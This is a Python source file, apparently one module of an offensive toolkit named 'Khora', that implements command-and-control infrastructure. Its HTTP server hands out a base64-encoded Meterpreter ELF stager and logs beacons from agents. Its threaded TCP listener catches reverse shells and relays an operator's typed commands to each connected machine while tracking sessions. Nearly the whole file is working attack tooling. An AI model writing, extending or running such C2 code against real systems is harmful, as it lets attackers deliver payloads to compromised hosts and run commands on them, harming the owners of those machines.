"""
C2 Module - Command & Control Infrastructure
HTTP Stager, Multi-Client Shell Handler, Session Management
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import base64
import threading
import socket
import logging
import time
import json
from datetime import datetime

logger = logging.getLogger("Khora.C2")

class SessionManager:
    """Manage multiple C2 sessions"""
    def __init__(self):
        self.sessions = {}
        self.session_lock = threading.RLock()
    
    def create_session(self, client_id, addr):
        with self.session_lock:
            self.sessions[client_id] = {
                'addr': addr,
                'connected_at': datetime.now(),
                'last_activity': datetime.now(),
                'commands_executed': 0,
                'command_history': [],
                'status': 'active'
            }
            logger.info(f"Session created: {client_id} from {addr}")
    
    def update_session(self, client_id, cmd=None):
        with self.session_lock:
            if client_id in self.sessions:
                self.sessions[client_id]['last_activity'] = datetime.now()
                if cmd:
                    self.sessions[client_id]['commands_executed'] += 1
                    self.sessions[client_id]['command_history'].append({
                        'cmd': cmd,
                        'time': str(datetime.now())
                    })
    
    def list_sessions(self):
        with self.session_lock:
            return list(self.sessions.keys())
    
    def get_session_info(self, client_id):
        with self.session_lock:
            return self.sessions.get(client_id)

class C2Module:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        self.session_manager = SessionManager()
        self.active_clients = {}
        self.clients_lock = threading.RLock()
    
    def http_server(self):
        """HTTP Server for payload staging and C2 communication"""
        module = self
        
        class Handler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                logger.debug(f"HTTP: {format % args}")
            
            def do_GET(self):
                """Serve stagers and command results"""
                if self.path == '/stager':
                    try:
                        with open('payloads/linux_x64_meter.elf', 'rb') as f:
                            data = base64.b64encode(f.read()).decode()
                        self.send_response(200)
                        self.send_header('Content-Type', 'text/plain')
                        self.end_headers()
                        self.wfile.write(data.encode())
                        logger.info(f"Stager served to {self.client_address[0]}")
                    except FileNotFoundError:
                        logger.warning("Stager payload not found")
                        self.send_response(404)
                        self.end_headers()
                    except Exception as e:
                        logger.error(f"GET error: {e}")
                        self.send_response(500)
                        self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_POST(self):
                """Receive beacon/shell output from agents"""
                try:
                    content_len = int(self.headers.get('Content-Length', 0))
                    data = self.rfile.read(content_len).decode()
                    
                    client_addr = self.client_address[0]
                    with module.clients_lock:
                        if client_addr not in module.active_clients:
                            module.session_manager.create_session(client_addr, self.client_address)
                        module.session_manager.update_session(client_addr, "beacon")
                    
                    logger.info(f"Beacon from {client_addr}: {data[:50]}")
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(b"OK")
                except Exception as e:
                    logger.error(f"POST error: {e}")
                    self.send_response(400)
                    self.end_headers()
        
        server = HTTPServer((self.lhost, 8080), Handler)
        logger.info(f"HTTP C2 server started: http://{self.lhost}:8080")
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            server.shutdown()
    
    def tcp_listener(self):
        """TCP listener for reverse shells"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.lhost, self.lport))
        s.listen(20)
        logger.info(f"TCP C2 listener: {self.lhost}:{self.lport}")
        print(f"[+] TCP listener: {self.lhost}:{self.lport}")
        
        try:
            while True:
                try:
                    client, addr = s.accept()
                    client_id = f"{addr[0]}:{addr[1]}"
                    
                    self.session_manager.create_session(client_id, addr)
                    with self.clients_lock:
                        self.active_clients[client_id] = client
                    
                    print(f"[+] Connection from {client_id}")
                    logger.info(f"Shell connected: {client_id}")
                    
                    thread = threading.Thread(
                        target=self.handle_shell, 
                        args=(client, addr, client_id),
                        daemon=True
                    )
                    thread.start()
                except socket.timeout:
                    continue
        except KeyboardInterrupt:
            pass
        finally:
            s.close()
    
    def handle_shell(self, client, addr, client_id):
        """Handle individual client connection"""
        try:
            client.send(b"Khora C2 shell> ")
            while True:
                try:
                    cmd = input(f"shell[{client_id}]> ")
                    
                    if cmd.lower() == 'exit':
                        client.send(b"exit\n")
                        break
                    elif cmd.lower() == 'history':
                        info = self.session_manager.get_session_info(client_id)
                        for entry in info['command_history'][-10:]:
                            print(f"  {entry['time']}: {entry['cmd']}")
                        continue
                    elif cmd.lower().startswith('sessions'):
                        active = self.session_manager.list_sessions()
                        print(f"[+] Active sessions: {len(active)}")
                        for sess in active:
                            info = self.session_manager.get_session_info(sess)
                            print(f"    {sess} - {info['commands_executed']} cmds")
                        continue
                    
                    if cmd.strip():
                        self.session_manager.update_session(client_id, cmd)
                        client.send((cmd + '\n').encode())
                        
                        result = client.recv(4096).decode('utf-8', errors='ignore')
                        print(result, end='')
                except (ConnectionResetError, BrokenPipeError):
                    print(f"\n[-] {client_id} disconnected")
                    break
        except Exception as e:
            logger.error(f"Shell error for {client_id}: {e}")
        finally:
            client.close()
            with self.clients_lock:
                if client_id in self.active_clients:
                    del self.active_clients[client_id]
            logger.info(f"Session ended: {client_id}")

def run(target, lhost, lport=4444):
    """Khora Framework entrypoint - C2 Module"""
    print(f"\n{'='*70}")
    print("C2 MODULE - Command & Control Infrastructure".center(70))
    print('='*70)
    print(f"Target: {target}")
    print(f"HTTP Stager: http://{lhost}:8080/stager")
    print(f"TCP Listener: {lhost}:{lport}\n")
    
    logger.info(f"C2 module starting on {lhost}:{lport}")
    
    c2 = C2Module(lhost, lport)
    
    # Start HTTP server in background
    http_thread = threading.Thread(target=c2.http_server, daemon=True)
    http_thread.start()
    time.sleep(0.5)
    
    # Start TCP listener (foreground)
    try:
        c2.tcp_listener()
    except KeyboardInterrupt:
        print("\n[+] C2 servers stopped")
    
    print(f"{'='*70}\n")
    logger.info("C2 module terminated")